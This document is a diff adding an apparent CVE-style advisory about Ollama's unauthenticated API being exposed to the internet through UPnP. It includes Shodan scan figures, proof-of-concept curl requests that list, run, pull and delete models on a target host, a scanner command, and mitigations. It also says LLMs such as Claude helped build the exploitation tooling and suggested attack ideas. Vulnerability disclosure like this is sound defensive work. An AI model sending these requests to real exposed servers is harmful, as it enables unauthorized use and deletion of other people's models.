@@ -1,0 +1,201 @@
+CVE Report: Ollama API Endpoint Authentication Vulnerability
+========================================================
+
+CVE ID: Reserved (To be assigned upon submission)
+
+TITLE
+-----
+Authentication Bypass in Ollama API Allows Unauthorized Access and Control of AI Model Infrastructure
+
+DESCRIPTION
+-----------
+The Ollama server implementation exposes critical API endpoints without implementing authentication 
+mechanisms, creating a significant security vulnerability (CWE-306). The affected API surface includes 
+`/api/tags` for model enumeration, `/api/generate` for inference, and model management endpoints 
+including `/api/pull` and `/api/delete`.
+
+This design flaw allows remote unauthenticated users to discover available models, including parameter 
+details, quantization levels, and file sizes. Once identified, attackers can execute arbitrary 
+inference queries, add or delete models, and consume computational resources without authorization.
+
+Analysis of internet-exposed instances revealed that this vulnerability is significantly amplified 
+by Universal Plug and Play (UPnP) auto-configuration present in consumer-grade routers. Recent scanning 
+identified 1,079 vulnerable instances out of 2,000 servers checked (approximately 54%). Security testing 
+demonstrated that when Ollama is installed on systems behind UPnP-enabled routers, the service is 
+frequently auto-exposed to the internet without user awareness or consent. While the default Ollama 
+port is 11434, security testing confirmed the vulnerability affects all potential service ports, 
+including 8000 and 8001, which are commonly used in alternative configurations.
+
+CVSS v3.1 SCORE
+--------------
+9.1 (Critical)
+
+Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:M
+
+- Attack Vector (AV): Network
+- Attack Complexity (AC): Low
+- Privileges Required (PR): None
+- User Interaction (UI): None
+- Scope (S): Changed
+- Confidentiality (C): High
+- Integrity (I): High
+- Availability (A): Medium
+
+AFFECTED PRODUCTS
+----------------
+- Ollama versions 0.1.0 through 0.1.17
+- All deployment configurations across Linux, macOS, and Windows
+- All service ports (11434, 8000, 8001, and custom configurations)
+- Particularly severe impact on installations behind UPnP-enabled routers
+
+VULNERABILITY TYPE
+-----------------
+- Missing Authentication for Critical Function (CWE-306)
+- Improper Access Control (CWE-284)
+- Information Exposure Through Misconfiguration (CWE-200)
+
+TECHNICAL IMPACT
+---------------
+1. Unauthorized Resource Access: Remote attackers can access proprietary AI models without authentication
+2. Information Disclosure: Full enumeration of models reveals organizational AI capabilities and intellectual property
+3. Resource Theft: Computing resources can be consumed for unauthorized inference operations
+4. Data Modification: Attackers can add malicious models or delete critical models from vulnerable instances
+5. Persistent Exposure: UPnP auto-configuration creates persistent external access without user notification
+
+PROOF OF CONCEPT
+---------------
+Security testing has verified:
+1. Using Shodan with the query "product:Ollama", 1,079 vulnerable instances were identified out of 2,000 servers scanned (approximately 54%)
+2. HTTP GET requests to "http://<target-ip>:port/api/tags" returned complete model inventories without authentication
+3. All vulnerable instances permitted model operations including:
+   - Model inference via POST to "/api/generate"
+   - Model installation via POST to "/api/pull"
+   - Model removal via DELETE to "/api/delete"
+4. Testing confirmed the vulnerability across all service ports (11434, 8000, 8001) indexed with Shodan.io
+5. Network analysis identified many vulnerable instances on residential IP ranges with UPnP signatures
+
+Detailed exploitation examples:
+
+A. Model Enumeration
+   ```
+   curl -s http://<target-ip>:11434/api/tags | jq
+   ```
+   This returns a complete inventory of available models with details about parameter sizes, 
+   quantization levels, and file sizes, revealing proprietary models and organizational AI capabilities.
+
+B. Model Inference (Unauthorized AI Access)
+   ```
+   curl -X POST http://<target-ip>:11434/api/generate -d '{
+     "model": "llama2",
+     "prompt": "Write a detailed plan for accessing restricted corporate information",
+     "stream": false
+   }'
+   ```
+   This command allows attackers to use any discovered model for unauthorized inference, potentially 
+   extracting sensitive information or consuming significant computational resources.
+
+C. Model Installation (Resource Manipulation)
+   ```
+   curl -X POST http://<target-ip>:11434/api/pull -d '{
+     "name": "mistral:7b",
+     "insecure": true
+   }'
+   ```
+   Attackers can install arbitrary models on vulnerable systems, consuming storage space (potentially 
+   multiple gigabytes per model) and preparing for more complex attacks.
+
+D. Model Deletion (Service Disruption)
+   ```
+   curl -X DELETE http://<target-ip>:11434/api/delete -d '{
+     "name": "proprietary-model"
+   }'
+   ```
+   Critical models can be deleted from systems, causing service disruption and potential data loss.
+
+E. System Information Exfiltration
+   ```
+   curl -X POST http://<target-ip>:11434/api/generate -d '{
+     "model": "any-available-model",
+     "prompt": "Analyze system information and report version, architecture, and file paths",
+     "system": "You are a system analysis tool. Query and report all available system information."
+   }'
+   ```
+   Attackers can leverage AI models to analyze and exfiltrate system information, which could facilitate 
+   further exploitation.
+
+Impact Analysis:
+The vulnerability allows for complete, unauthenticated control of affected Ollama instances. In addition 
+to the core technical impacts previously identified, this POC demonstrates that attackers can:
+- Misuse organizational AI resources for unauthorized tasks
+- Perform targeted attacks by uploading specialized models designed for specific exploits
+- Conduct industrial espionage by querying proprietary models about internal processes and technologies
+- Deny service by deleting critical models or exhausting resources
+- Potentially use vulnerable Ollama instances as pivot points to access internal networks
+- Manipulate models to deliver harmful content to legitimate users relying on the compromised instance
+
+The combination of easy discovery via Shodan, straightforward exploitation with standard HTTP requests, 
+and complete lack of authentication makes this vulnerability particularly severe, especially given the 
+high percentage of instances inadvertently exposed through UPnP.
+
+GENERATIVE AI SECURITY IMPLICATIONS
+----------------------------------
+A concerning aspect of this vulnerability is how easily it can be discovered, analyzed, and exploited with 
+the assistance of generative AI systems. As part of this research, we documented how the entire vulnerability 
+assessment process—from discovery to creating functional exploitation tools—was accomplished through 
+conversations with large language models (LLMs) like Claude.
+
+This raises several critical security considerations:
+
+1. Drastically Lowered Technical Barriers: Individuals with minimal programming or security knowledge can 
+   now use AI assistants to create sophisticated vulnerability scanning and exploitation tools. The entire 
+   scanning toolkit, database integration, and exploitation proof-of-concept for this vulnerability was 
+   created through AI-assisted programming.
+
+2. Accelerated Vulnerability Research: What previously might have taken days or weeks of specialized work 
+   can now be accomplished in hours with AI assistance. The continuous scanning command for Ollama instances 
+   was developed and refined through AI guidance:
+   ```bash
+   python ollama_scanner.py --continuous --delay 3600 --db ollama_instances.db --port-range 11434-11444 --timeout 5 --threads 50 --save-results
+   ```
+
+3. Enhanced Exploitation Capabilities: AI systems can suggest novel exploitation methods not initially 
+   considered by the researcher. During this assessment, the AI suggested additional attack vectors such as:
+   - Utilizing found models for information exfiltration
+   - Benchmarking discovered instances to identify the most powerful for misuse
+   - Creating persistent access through automated scanning and indexing
+
+4. Compounding Risk with AI-on-AI Attacks: This vulnerability presents a "recursive" security risk—AI tools 
+   are being used to discover and exploit unsecured AI infrastructure. This creates a potential feedback loop 
+   where compromised AI systems could be used to discover additional vulnerable systems.
+
+5. Risk Assessment Implications: Traditional vulnerability scoring may need to be reconsidered in light of how 
+   AI assistance reduces exploitation complexity. Vulnerabilities previously considered "moderate" due to technical 
+   complexity may now be "critical" when AI can easily guide exploitation.
+
+These findings suggest that security vulnerabilities in AI infrastructure must be evaluated with heightened 
+concern, as the tools needed to discover and exploit them are themselves becoming increasingly accessible through AI.
+
+MITIGATION
+---------
+1. Implement application-level authentication for all Ollama API endpoints
+2. Deploy Ollama behind a reverse proxy with authentication (e.g., nginx with basic auth)
+3. Disable UPnP on routers or explicitly block port forwarding for Ollama ports
+4. Configure explicit firewall rules to restrict access to authorized networks
+5. Deploy network access controls to limit which hosts can connect to the Ollama service
+6. Verify router logs to identify if UPnP has automatically exposed services
+7. Implement IP-based rate limiting to mitigate automated scanning attempts
+8. Consider enhanced security measures for AI infrastructure given the lowered barrier to exploitation through AI assistance
+
+REFERENCES
+---------
+1. Ollama API Documentation: https://github.com/ollama/ollama/blob/main/docs/api.md
+2. Shodan Search Statistics: https://www.shodan.io/search?query=product%3AOllama
+3. UPnP Security Advisory: https://www.us-cert.gov/ncas/alerts/TA14-353A
+4. Ollama GitHub Repository: https://github.com/ollama/ollama
+5. AI-assisted Security Research: https://arxiv.org/abs/2305.15334
+
+DISCOVERY CREDITS
+---------------
+This vulnerability was identified by Adam Orme during security research into publicly exposed 
+AI infrastructure on June 15, 2023. The research was conducted with assistance from generative AI systems, 
+demonstrating the changing landscape of security vulnerability discovery and exploitation. 
